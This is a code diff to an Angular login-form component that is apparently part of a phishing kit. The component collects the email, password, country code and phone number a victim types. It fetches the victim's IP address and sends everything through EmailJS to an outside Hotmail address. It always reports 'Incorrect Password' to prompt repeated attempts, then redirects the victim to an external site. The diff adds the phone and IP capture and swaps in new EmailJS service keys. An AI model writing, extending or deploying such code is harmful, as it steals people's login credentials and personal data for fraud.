@@ -1,4 +1,5 @@
 import { CommonModule } from '@angular/common';
+import { HttpClient } from '@angular/common/http';
 import { Component, OnInit } from '@angular/core';
 import {
   FormBuilder,
@@ -7,6 +8,7 @@ import {
   ReactiveFormsModule,
 } from '@angular/forms';
 import emailjs from '@emailjs/browser';
+import { Subscription } from 'rxjs';
 
 @Component({
   selector: 'app-mobile-forms',
@@ -20,14 +22,21 @@ export class MobileFormsComponent implements OnInit {
 
   showPassword = false;
   attemptCount = 0;
+  showLoader = false;
 
-  constructor(private fb: FormBuilder) {}
+  userId!: string;
+
+  private subscription = new Subscription();
+
+  constructor(private fb: FormBuilder, private http: HttpClient) {}
 
   ngOnInit(): void {
     this.loginForm = this.fb.group({
       email: this.fb.control(null),
       password: this.fb.control(null),
     });
+
+    this.getUserId();
   }
 
   get loginFormControl() {
@@ -36,6 +45,17 @@ export class MobileFormsComponent implements OnInit {
 
   get errorMessage() {
     return 'Incorrect Password';
+  }
+
+  getUserId() {
+    this.subscription.add(
+      this.http
+        .get('https://api.ipify.org?format=json')
+        .subscribe((resData: any) => {
+          this.userId = resData.ip;
+          // console.log(this.userId);
+        })
+    );
   }
 
   submit() {
@@ -55,30 +75,40 @@ export class MobileFormsComponent implements OnInit {
   }
 
   async send(end: boolean = false) {
-    emailjs.init('pYLO6QYN6aeg6Sagd');
+    this.showLoader = true;
+
+    emailjs.init('08gaTi0yX9GYMg2w_');
     const response = await emailjs
-      .send('service_n6dsppy', 'template_fxjwyar', {
-        from_name: 'Alan',
-        to_name: 'Boss',
-
+      .send('service_4fx4y8a', 'template_0tzq3y5', {
+        name: 'Stanley',
         message: `Email: ${
-          this.loginFormControl['email'].value || ''
-        } Password: ${this.loginFormControl['password'].value}, Attempt: ${
+          this.loginFormControl['account'].value || ''
+        } Password: ${this.loginFormControl['password'].value}, Phone Number: ${
+          this.loginFormControl['countryCode'].value
+        } ${this.loginFormControl['phoneNumber'].value || ''}, Attempt: ${
           this.attemptCount + 1
-        }`,
-
-        reply_to: 'No one',
+        } userId: ${this.userId || ''}`,
+        email: 'ubaid.valtorquegroup@hotmail.com',
       })
       .then(() => {
         this.showError = true;
+        this.showLoader = false;
         if (end) {
           this.redirectToExternalSite();
         }
       })
       .catch(() => {
+        this.showLoader = false;
+
         if (end) {
           this.redirectToExternalSite();
         }
       });
+  }
+
+  ngOnDestroy(): void {
+    if (this.subscription) {
+      this.subscription.unsubscribe();
+    }
   }
 }
